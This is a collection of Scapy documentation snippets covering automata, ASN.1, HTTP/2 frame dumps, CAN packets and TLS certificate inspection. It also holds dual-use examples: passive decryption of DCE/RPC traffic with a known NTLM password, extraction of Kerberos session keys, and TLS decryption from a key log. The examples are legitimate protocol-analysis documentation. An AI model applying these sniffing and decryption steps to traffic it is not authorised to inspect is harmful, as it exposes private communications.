https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n@ATMT.action(wait_for_nothing)\ndef on_nothing(self):\n    print(\"Action on 'nothing' condition\")\n\n@ATMT.state(final=1)\ndef END(self):\n    print(\"State=END\")\n```\n\n----------------------------------------\n\nTITLE: Extracting Subkey from Kerberos Authenticator in Scapy\nDESCRIPTION: This snippet extracts the subkey from the decrypted Kerberos authenticator, which is used to compute the armor key.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\n>>> subkey = authenticator.subkey.toKey()\n>>> subkey.key\nb'%\\xa4n\\xe1\\xd0\\xf5\\x8d\\xc4\\x8d\\xecv\\xe8\\x9c\\xd3\\xc9\\xee\\x1bu\\xc9\\xa5\\xa6\\xf8\\x83f\\x98\\xa1\\xd9\\xe7*I\\x9b\\xf8'\n```\n\n----------------------------------------\n\nTITLE: Creating TUN Interface in Scapy\nDESCRIPTION: Python code to create a TUN interface named 'tun0' using Scapy's TunTapInterface class.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> t = TunTapInterface('tun0')\n```\n\n----------------------------------------\n\nTITLE: Changing States in Scapy Automaton\nDESCRIPTION: This snippet shows how to change states in a Scapy automaton by raising exceptions. It demonstrates passing parameters to states and actions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n@ATMT.state()\ndef MY_STATE(self, param1, param2):\n    print(\"state=MY_STATE. param1=%r param2=%r\" % (param1, param2))\n\n@ATMT.receive_condition(ANOTHER_STATE)\ndef received_ICMP(self, pkt):\n    if ICMP in pkt:\n        raise self.MY_STATE(\"got icmp\", pkt[ICMP].type).action_parameters(pkt[ICMP].type, pkt[ICMP].code)\n\n@ATMT.action(received_ICMP)\ndef on_ICMP(self, icmp_type, icmp_code):\n    self.retaliate(icmp_type, icmp_code)\n```\n\n----------------------------------------\n\nTITLE: Encoding ASN.1 Objects with Specific Codec in Python\nDESCRIPTION: Demonstrates how to encode ASN.1 objects using a specific codec (BER) or the default codec in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_4\n\nLANGUAGE: Python\nCODE:\n```\n>>> x.enc(ASN1_Codecs.BER)\n'0\\r\\x02\\x01\\x07\\x04\\x03egg0\\x03\\x01\\x01\\x00'\n>>> raw(x)\n'0\\r\\x02\\x01\\x07\\x04\\x03egg0\\x03\\x01\\x01\\x00'\n>>> xx,remain = BERcodec_Object.dec(_)\n>>> xx.show()\n# ASN1_SEQUENCE:\n  <ASN1_INTEGER[7L]>\n  <ASN1_STRING['egg']>\n  # ASN1_SEQUENCE:\n    <ASN1_BOOLEAN[0L]>\n\n>>> remain\n''\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Source in Scapy PipeTools\nDESCRIPTION: This snippet demonstrates how to create a custom Source for Scapy's PipeTools by extending the AutoSource class. It shows the implementation of CLIHighFeeder as an example.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nclass CLIFeeder(CLIFeeder):\n    def send(self, msg):\n        self._gen_high_data(msg)\n    def close(self):\n        self.is_exhausted = True\n```\n\n----------------------------------------\n\nTITLE: Disabling Promiscuous Mode\nDESCRIPTION: Configuration to disable promiscuous mode in Scapy to resolve hardware filter errors.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/troubleshooting.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nconf.sniff_promisc = False\n```\n\n----------------------------------------\n\nTITLE: Configuring Passive Sniffing for DCERPC in Python with Scapy\nDESCRIPTION: This snippet demonstrates how to configure Scapy for passive sniffing of DCERPC sessions, including setting up SSPs for decryption and integrity checks.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\n\n# Bind DCE/RPC port\nbind_bottom_up(TCP, DceRpc5, dport=12345)\nbind_bottom_up(TCP, DceRpc5, dport=12345)\n\n# Enable passive DCE/RPC session\nconf.dcerpc_session_enable = True\n\n# Define SSPs that can be used for decryption / verify\nconf.winssps_passive = [\n    SPNEGOSSP([\n        NTLMSSP(\n            IDENTITIES={\n                \"User1\": MD4le(\"Password1!\"),\n            },\n        ),\n    ])\n]\n\n# Sniff\npkts = sniff(offline=\"dcerpc_exchange.pcapng\", session=TCPSession)\npkts.show()\n```\n\n----------------------------------------\n\nTITLE: Enabling SCTP Dynamic Address Reconfiguration in Linux\nDESCRIPTION: This command enables the dynamic address reconfiguration capability for SCTP as described in RFC 5061. It modifies the Linux kernel parameter to enable this feature.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/sctp.rst#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo echo 1 > /proc/sys/net/sctp/addip_enable\n```\n\n----------------------------------------\n\nTITLE: Retrieving Ticket Session Key in Scapy\nDESCRIPTION: This snippet demonstrates how to retrieve the ticket session key from an encrypted ticket part and convert it to a Key object.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\n>>> ticket_session_key = encticketpart.key.toKey()\n>>> ticket_session_key.key\nb'\\xe3\\xa2\\x0f\\x8e\\xb2\\xe1*\\xe0\\x7f\\x86\\xcc\\x88\\xe6,\\x08>B\\xd8)m/G\\x82B;\\x9f+\\x86\\xcd\\xcd\\xf4\\x05'\n```\n\n----------------------------------------\n\nTITLE: Printing HTTP/2 Response Headers in Python\nDESCRIPTION: Displays the HTTP/2 response headers from a favicon request, showing status code, content type, and other metadata from the stream_txt array.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_29\n\nLANGUAGE: python\nCODE:\n```\nprint(stream_txt[3])\n```\n\n----------------------------------------\n\nTITLE: Plotting Network Packet Data with Scapy and Matplotlib\nDESCRIPTION: This code snippet appears to be using Scapy's multiplot functionality to create a visualization of network packet data. The plot is likely showing correlations between packet parameters across a capture.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/graphs-ipids.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nans.multiplot(lambda p, q: (q[IP].src, q[IP].id))\n```\n\n----------------------------------------\n\nTITLE: Creating a SignalPacket Class for Float Signals in Python\nDESCRIPTION: This snippet defines a SignalPacket class named 'testFrameFloat' with two float signal fields, demonstrating how to create custom packet structures for CAN communication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nclass testFrameFloat(SignalPacket):\n    fields_desc = [\n        LEFloatSignalField(\"floatSignal2\", default=0, start=32),\n        BEFloatSignalField(\"floatSignal1\", default=0, start=7)\n    ]\n```\n\n----------------------------------------\n\nTITLE: Logging Commands Applied to an Ecu Object\nDESCRIPTION: This example shows how to use the Ecu utility to log and analyze UDS commands applied to an ECU.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_32\n\nLANGUAGE: python\nCODE:\n```\necu = Ecu(verbose=False, store_supported_responses=False)\necu.update(PacketList(msgs))\nprint(ecu.log)\ntimestamp, value = ecu.log[\"DiagnosticSessionControl\"][0]\n```\n\n----------------------------------------\n\nTITLE: Key Modulus Comparison\nDESCRIPTION: Compares public and private key moduli from certificate and key file.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\ncert.tbsCertificate.subjectPublicKeyInfo.subjectPublicKey.modulus == privkey.modulus\n```\n\n----------------------------------------\n\nTITLE: Creating and Displaying ASN.1 Objects in Python\nDESCRIPTION: Demonstrates how to create a compound ASN.1 object and display its structure using Scapy's classes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_2\n\nLANGUAGE: Python\nCODE:\n```\n>>> x=ASN1_SEQUENCE([ASN1_INTEGER(7),ASN1_STRING(\"egg\"),ASN1_SEQUENCE([ASN1_BOOLEAN(False)])])\n>>> x\n<ASN1_SEQUENCE[[<ASN1_INTEGER[7]>, <ASN1_STRING['egg']>, <ASN1_SEQUENCE[[<ASN1_BOOLEAN[False]>]]>]]>\n>>> x.show()\n# ASN1_SEQUENCE:\n  <ASN1_INTEGER[7]>\n  <ASN1_STRING['egg']>\n  # ASN1_SEQUENCE:\n    <ASN1_BOOLEAN[False]>\n```\n\n----------------------------------------\n\nTITLE: Computing Kerberos Armor Key in Scapy\nDESCRIPTION: This code computes the Kerberos armor key using the KRB_FX_CF2 function as specified in RFC 6113 section 5.4.1.1.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\n>>> from scapy.libs.rfc3961 import KRB_FX_CF2\n>>> armorkey = KRB_FX_CF2(subkey, ticket_session_key, b\"subkeyarmor\", b\"ticketarmor\")\n>>> print(armorkey.key)\nb'\\x9f\\x18L]I\\x16\\xd0\\xe5\\xa6\\xd9\\x92+\\xbf\\xbc\\xe0\\n\\xd1\\xcb6\\xf3\\xd1.C\\xc2\\xdcp\\xf0H(\\x99\\x14\\x80'\n```\n\n----------------------------------------\n\nTITLE: Creating an Indexed Authority Header for HTTP/2\nDESCRIPTION: Creates an HTTP/2 authority header using the HPack indexed header field format. Uses a previously found index from the dynamic table to reference the ':authority www.google.fr' header and appends it to the headers frame.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_36\n\nLANGUAGE: python\nCODE:\n```\nhost_hdr = h2.HPackIndexedHdr(index=host_hdr_idx)\nhost_hdr.show()\nhdrs_frm.payload.hdrs.append(host_hdr)\n```\n\n----------------------------------------\n\nTITLE: Implementing Variable Length Quantities in Python\nDESCRIPTION: This code defines functions to convert between variable length quantities and strings, which is useful for certain protocol implementations.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\ndef vlenq2str(l):\n    s = []\n    s.append(l & 0x7F)\n    l = l >> 7\n    while l > 0:\n        s.append( 0x80 | (l & 0x7F) )\n        l = l >> 7\n    s.reverse()\n    return bytes(bytearray(s))\n\ndef str2vlenq(s=b\"\"):\n    i = l = 0\n    while i < len(s) and ord(s[i:i+1]) & 0x80:\n        l = l << 7\n        l = l + (ord(s[i:i+1]) & 0x7F)\n        i = i + 1\n    if i == len(s):\n        warning(\"Broken vlenq: no ending byte\")\n    l = l << 7\n    l = l + (ord(s[i:i+1]) & 0x7F)\n\n    return s[i+1:], l\n```\n\n----------------------------------------\n\nTITLE: Decrypting PFS-Protected Traffic with NSS Keys\nDESCRIPTION: Configures Scapy for TLS decryption using NSS Key Log file and reads packet capture\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook3_tls_compromised.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nload_layer(\"tls\")\n\nconf.tls_session_enable = True\nconf.tls_nss_filename = \"raw_data/tls_nss_example.keys.txt\"\n\npackets = rdpcap(\"raw_data/tls_nss_example.pcap\")\n```\n\n----------------------------------------\n\nTITLE: HTTP/2 HPack Headers with Data Frame\nDESCRIPTION: Shows the structure of multiple HTTP/2 HPack literal headers with incremental indexing, including compressed header strings containing various HTTP headers like dates, content options, and cache control. Ends with an HTTP/2 data frame with End Stream flag set.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_23\n\nLANGUAGE: text\nCODE:\n```\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 33\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 22\n   |      |   |  data      = 'HPackZString(Thu, 08 Dec 2016 06:23:59 GMT)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 36\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 22\n   |      |   |  data      = 'HPackZString(Fri, 16 Dec 2016 06:23:59 GMT)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 44\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 22\n   |      |   |  data      = 'HPackZString(Thu, 08 Dec 2016 01:00:57 GMT)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 0\n   |      |  \\hdr_name  \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 16\n   |      |   |  data      = 'HPackZString(x-content-type-options)'\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 5\n   |      |   |  data      = 'HPackZString(nosniff)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 54\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 3\n   |      |   |  data      = 'HPackZString(sffe)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 28\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 3\n   |      |   |  data      = 'HPackZString(1494)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 0\n   |      |  \\hdr_name  \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 12\n   |      |   |  data      = 'HPackZString(x-xss-protection)'\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 10\n   |      |   |  data      = 'HPackZString(1; mode=block)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 24\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 16\n   |      |   |  data      = 'HPackZString(public, max-age=691200)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 21\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 5\n   |      |   |  data      = 'HPackZString(472252)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 0\n   |      |  \\hdr_name  \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 5\n   |      |   |  data      = 'HPackZString(alt-svc)'\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 28\n   |      |   |  data      = 'HPackZString(quic=\":443\"; ma=2592000; v=\"35,34\")'\n   |###[ HTTP/2 Frame ]### \n   |  len       = 0x5d6\n   |  type      = DataFrm\n   |  flags     = set(['End Stream (ES)'])\n   |  reserved  = 0L\n   |  stream_id = 3L\n   |###[ HTTP/2 Data Frame ]### \n\n```\n\n----------------------------------------\n\nTITLE: Examining Certificate Domain Details\nDESCRIPTION: Analyzes domain information and certificate extensions\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nrecord1.msg[0].ext[0].show()\n\nx509c = record3.msg[0].certs[0][1].x509Cert\nprint(type(x509c))\nx509c.tbsCertificate.extensions[2].show()\n```\n\n----------------------------------------\n\nTITLE: Defining Automaton States and Actions in Python\nDESCRIPTION: This snippet demonstrates how to define states, conditions, and actions in a Scapy Automaton class. It shows the use of decorators like @ATMT.state, @ATMT.condition, and @ATMT.action to create a simple state machine with random transitions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nfrom random import random\n\nclass Example(Automaton):\n    @ATMT.state(initial=1)\n    def BEGIN(self):\n        pass\n\n    @ATMT.state(final=1)\n    def END(self):\n        pass\n\n    @ATMT.condition(BEGIN, prio=1)\n    def maybe_go_to_end(self):\n        if random() > 0.5:\n            raise self.END()\n\n    @ATMT.condition(BEGIN, prio=2)\n    def certainly_go_to_end(self):\n        raise self.END()\n\n    @ATMT.action(maybe_go_to_end)\n    def maybe_action(self):\n        print(\"We are lucky...\")\n\n    @ATMT.action(certainly_go_to_end)\n    def certainly_action(self):\n        print(\"We are not lucky...\")\n\n    @ATMT.action(maybe_go_to_end, prio=1)\n    @ATMT.action(certainly_go_to_end, prio=1)\n    def always_action(self):\n        print(\"This wasn't luck!...\")\n```\n\n----------------------------------------\n\nTITLE: Analyzing HTTP/2 Frame Structure with Padded Data\nDESCRIPTION: This snippet shows the detailed output of an HTTP/2 frame analysis, including header fields like length, type, flags, and stream ID. The frame is a padded data frame containing a large binary payload with a padding length of 189 bytes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_49\n\nLANGUAGE: text\nCODE:\n```\n###[ HTTP/2 Frame ]### \n  len       = 0x15b2\n  type      = DataFrm\n  flags     = set(['Padded (P)'])\n  reserved  = 0L\n  stream_id = 5L\n###[ HTTP/2 Padded Data Frame ]### \n     padlen    = 189\n     data      = '\\xdc=\\xdbv\\xea\\xc6\\x92\\xef\\xf3\\x15\\n\\x99\\xec\\x93\\xacc\\xee\\x17\\x03\\xfb\\xe0,\\x19\\x9b\\x8b16\\x18\\xe3[\\x92\\xe5%\\xa4\\x06\\xb5\\x11\\x92\\xac\\x0b\\x18\\x92\\xfcK\\xde\\xe7\\x13\\xe6e^\\xe7/\\xce\\xdb,\\xff\\xc5TuK a\\xecmc\\xd8;{\\xaf\\xec`]Z\\xdd]\\xd5\\xd5U\\xd5U\\xddU@7/\\xb27%D&\\x9f\\xda\\x9e\\x17\\xd8\\x85\\x17y2\\xcb\\x17\\xf3:4H\\x8e\\x1e\\xbe\\xc7]v\\x02nT\\x13p\\xfb\\x97\\x80\\xfb\\xb8\"{\\xe7\\x06J\\xf3%F\\x1f\\xc1\\x02\\x91\\xbd\\xb9\\x12\\xe1}z\\x04\\x1f\\xf8\\xac\\xd0S\\x1c\\xefK\\x8cX?H#\\xf3#%<\\xa0\\x03\\xbb1\\xad\\x91R\\xa2c\\xddfw\\x9eB\\xa9\\xe9#~?\\xd74\\xd9K\\xa9t\\xc5.p\\xcd\\x90\\x90\\xd4n\\xe3p\\x02\\xaay\\xa1w\\x90\\x1a\\xd7\\xda\\xa2zQN\\x9d\\x19\\x8dZ\\xfb\\xa8*\\x8aF\\xfbV\\xec\\xd6\\xf7\\xdbA\\x8d\\xf4\\xcbt\\x7fL\\x95u{\\x0f\\xd4rA\\x95G\\xe3\\x0b\\xf6\\x1e\\x94\\xd8u{?YVw\\xbf\\x0c\\x04\\xb6j\\x98k\\x82P\\x16#{\\x1d\\xf8\\xdc\\x04\\x1e\\xbf&\\x00/\\xadx\\x82@\\xb9\\xa3R\\xf2)tkt\\xb9\\xbdX;}\\x19|\\xf7\\x86\\xebRL\\x19\\xe8\\xfd\\x98\\x8e\\xad\\xd0l]\\xc0\\xf0~\\x0e\\xb8\\x99z8\\xd3fKwf\\xa6\\xb8\\xa3=\\x13\\x06:\\xe2\\xdfQ@\\xac+s\\x81\\xab\\x10{\\x88;\\x8f<\\x15g\\x1e\\xf1\\xe3v\\xdf\\xdd\\xc1\\x1f\\xef8\\x92\\x7f\\xed\\xc7\\xb6\\x90\\xf0\\x9e\\xbf\\xe1\\x97\\xcf\\x9d\\x9d\\x1a\\xee\\xf7BG\\xa0\\xd8\\x81\\xd5\\xe5}\\xed\\xaf?\\xd4\\xbapVz\\xca\\x0cS*\\xf9\\x16\\xdb\\x15:0h\\xbd\\xa9\\xb9\\xf9\\x02d\\x04\\x8f\\xf5#\\x9c\\xf2U (\\x9a)X\\x07j~\\x89\\x11Q<\\x1d\\xaf\\xa7\\xb0\\x98:\\xc1\\x97N\\xcfa\\xcf\\x16\\xf7\\x86\\xed\\xe9\\xb4\\xd6-\\x97>\\x82Fl\\xc1\\x94\\xa6P1~\\x1b*\\xeb\\xf2\\xb2\\xb2\\x83\\x07/`\\xc9dM+gAB\\xbf\\x7f/\\x81;\\x1e}\\xdb%h\\xa38o\\x83=\\x95\\xadR\\xf8\\xc1\\xdbH\\xdf\\x9ct\\xeb\\x07\\xc0,[\\x00\\xda_E\\xa1bI\\xb0\\x88\\xe43\\x00\\xe1\\x8c\\xbb\\xda\\x9e\\x0f\\xf1\\xdb0\\xe6\\x10\\x8e3\\x8c\\xb7\\xe4\\x92\\x17\\xd0\\x06\\x1f`\\x99\\xdb$\\x8b\\xc9\\xb4\\r\\xa4iV\\xd1o\\x81=\\xd3\\xac\\x12\\xbb\\xf7n\\xd7E\\x18\\x08v\\x81\\xe8B\\x1fP\\xf6\\x7f\\x12\\xb5\\xdf\\x83\\xb4{\\x05\\xb1\\x86\\x1e\\'\\x81\\xea\\n\\xed\\xf7\\x1f\\xd1\\xbeJ\\x9eG\\x1a~\\xa0n\\t]Pwq\\x1d\\x9d\\xc7\\xc7\\x8c\\xd04\\xa8n\\x0b\\xca?\\\\\\x9d\\x08*q\\xad\\x00==\\x07\\x8b\\xb2EX\\xd6\\xd1\\x80\\x96a!B*\\xf3\\x17\\x83\\xc5\\xfe40\\x93-\\x023\\xd9\\xd4\\xc0\\xd8d$Q\\xfd\\x15C3\\xda\"4\\xa3\\xcd@#\\x8c\\x0c\\xfa\\x8aq\\x99n\\x11\\x92\\xe9\\x86 \\x91\\xf4w1_\\x1a\\x14W\\xd6#\\xda\\x93%\\xe7%\\xe6Ko\\x93\\xdb\\xe2\\xba\\xb4\\x98|\\x07R\\x9a\\x86#\\xfc\\x1b\\x06\\xd6Y\\x85\\x0f~\\x15Z_\\xae\\xb6\\x91-\\xceC\\x86W\\x99\\xb6\\xa7\\r\\x04N\\x13F\\xf6\\x0e\\xf51\\xb5\\x0c]H\\x16\\x12\\x1f\\xbeO\\xe6\\x12\\x1f\\x13\\x89\\xc4_\\x01$\\x06\\xcd\\xc6\\xf8e\\xa0\\x1d\\xff\\xccddo\\xa9\\xd8\\\\\\xf7\\xf2\\x1fP\\xfe\\xa1\\xa1\\x85\\xfa3@#^\\xda\\xbf\\xe3\\x82\\xd0\\x1b\\x08\\xd7\\xd2`\\x14\\x02fc\\x9b\\xc8\\n\\x19\\xb3\\xf8\\x86\\xa6e\\xdc\\x11\\xd9\\xb1\\xe3l\\x90\\xe2>\\xba\\xbb\\xafGwe0\\xe86E\\x91/\\x03\\xecAI\\xac\\xb4\\xef\\xca\\'\\xb5\\xda0}x\\x9d\\xbfI\\xb6\\xba\\xbb\\x07w\\xb2\\xa8\\r\\xab\\x9939}ag\\x0b\\xd8\\xd3\\xde^\\x07\\xdbcN\\x9c\\xa8\\xd0!\\xf2\\x01\\xef\\x8fg\\xe1K\\x87Q\\x1d\\xc6\\xfcp\\xbcl\\x19\\xf3\\xcf\\xba2U\\x17\\x0f\\xbd\\xef=\\x07%4l\\xfb\\r\\xc7\\xff\\x15geC+\\x0c}\\xbf\\x176l\\x857\\xd6E\\x04C\\x975*\\x0fK\\x9e\\xeb.\\x86\\x8e;\\xcf?\\x16a[\\x1a\\xa3\\xe4\\xc1\\x94t\\x05\\xfd\\x82}I\\xb3\\x89\\xf7T\\x95l\\xd30]P\\xb5\\xd1\\xce\\x1d\\xc1\\xb8 \\xccA\\xc9\\x8cq\\xbe\\xbf\\x10n>\\x85\\xee\\xdd\\xfdD\\xbdr.\\x8aKV\\xa5\\xdb\\xd3D\\xc0\\xce\\xb3\\xbc\\xe8\\x08\\x06\\xf4\\xf2\\r\\xe6\\x91e\\xafhD\\xb0\\x0c\\x86Tv\\xbd\\xe8_\\x14\\xe77N\\x97\\xc5\\xf4\\xc7\\xa3&\\xa1\\x85\\xd8\\r\\xdc\\xaf&7\\xd2\\x93%Y\\xf5\\xfd8\\xe8*\\xf1\\xc2\\\\2w@\\xc8\\x9e\\xcf\\n\\x16E\\x9bVNT\\xad\\x962\\x87G\\xc5W\\x11\\xed\\x0f\\xa9lj\\x9f]\\xfe\\x90\\xca\\xa9\\x1a\\xd4\\xd4\\xb7\\xe0Jv\\xb0NM\\x1f\\xaeA\\xd4uqp\\xf5\\x94\\xa8\\x0fm9g4\\xaeN\\xf7{\\xb4\\xad\\xe8\\xd3q\\xf2x&f\\xf6\\xc9A\\xe20;\\xc0\\xc9/0\\x08V\\x89\\x91\\x17\\x11\\xe61\\xca\\x10s\\xbc/1#\\x1aQ\\x8a/\\xc3\\xfe\\xcf\\x05s\\x05\\x9e\\\\Z\\x87_\\xd6&\\x83\\xeb&\\x12\\x14WHm:\\xa2\\x9aDCzJ\\x90[\\x06~CfMgiZS[\\x90\\x04\\xd3\\x98\\xc0\\xb2\\r\\x04\\x0f;`\\xc47\\xea\\xc2\"H\\x1e\\x12G\\x18I:5]\\x8d9\\xe9\\x04\\x00k`I\\xa3\\x98Pw\\xd8\\x97,\\x98\\x9c!\\xf4\\x01d\"\\x18\\x96\\xf0\\xaf\\x9e\\xb5\\xf7\\x1f\\xe8\\xd4S\\xfc\\xefm\\xc1\\xe8C\\x0b\\x13\\nOtw\\xd4#\\x16>\\xf0\\xb7\\x80\\xd9;\\xa0\\x9f\\xe8\\x8a\\xe0\\xa8d\\x04s\\x16\\xffBQ\\x8b\\xec\\xc0\\x18\\x99\\x0eha\\xdc\\x8e\\x19\\x8b\\xc5\\xfcI\\x83\\xbe\\xa2\\x00\\'0lmM\\x1e\\xaa\\x18\\xf2:|41\\xa8\\xd7\\xabt \\xae \\xbb\\xfa\\xa4.[\\x86\\x9a\\xbd\\x16\\xfb\\xd5\\xb3h}\\xb7z]Q\\x8e\\xa9|ry\\x88\\x16\\x1el\\xf4\\x1f \\xfc\\xbd\\xed$\\x0c\\x9f\\xdf1G]TX\\x1b\\x00\\xd7\\x06b\\x88a\\xa8\\xc6uA\\x99\\x0e\\xf6\\x9f\\x82R\\x19)\\xd1\\xdd\\x06\\xed\\xe5\\xa5\\xccq\\x99\\xea\\xc9\\xa1\\x9c\\xa8\\x1ee\\x13\\xfb\\xf5N\\x06@\\xe9b\\xa3\\xef\\xea9\\x19\\x19\\xef\\xe9t\\xad<(\\xaf\\x90e\\x17v.\\xe1\\xce&m[\\xad\\xa52\\x83\\xb3j\\xbes\\xa4\\xe4n\\xbb\\xd5\\xec\\x04\\xd4\\x8c\\xb6\\x0b\\xe2@\\xc0\\x96\\x85\\xa2\\x80^\\xdb\\x05\\xa5\\xbf\\x03\\x14\\x07T\\xebu\\xa9\\xa8\\xd6\\x19\\x1c\\xac\\xa0\\xa26\\x9dM\\x1aW jnv5\\xcd\\xb0\\xef\\x1e*\\x85D\\xfb>Y\\xbdIL<*\\xc2F\\x9f\\xd8\\xae\\x9eX\\xe16\\xa3i\\xbc\\x9b\\xc8@\\xef\\xe87\\xc5\\xc3\\xb7\\x13\\x98\\xf0\\xe1\\xfb|*\\x99\\xfa(\\x84\\xd8\\xd58\\x15K\\xc6\\x92Q\\xe8mx&}9\\xf5$\\x8c\\xa1\\xafVY\\xa9\\x1f\\x88\\xfb\\xdf\\xac\\xb2R\\x1f\\xb65\\xbb%\\xf7\\xa4\\x8b\\xee+\\x95\\x95\\xf0\\xa8nGu\\xa1\\xab\\xe6E>=\\xa8;U\\xf1\\xa0s{vY\\xef\\xcb\\'\\x8dQ2Q\\xbd\\x99\\x1d\\xf7\\xda_Hu\\tcb3\\x8a\\xcc\\x1d@\\xbeAE\\xe6\\xc3\\xf7\\xe9\\xc2G\\x9b\\xab3\\x01\\x05\\xc6V\\x89\\xa6\\xa1\\x9ab\\xb9\\xc8\\xefA\\x0b\\x81w#\\xaaK\\x1a(\\x1d\\xb6\\x8d[\\xd1\\x853\\x8c\\xc1lZtL5\\x82\\xbd\\x91,PS\\x08\\x86\\xa7\\xe1\\xba\\x0c(7\\xbe\\x82\\xe2+4\\xa0\\xb2\\x18\\xc2\\x84\\xb0F\\xa1\\xb4kS} 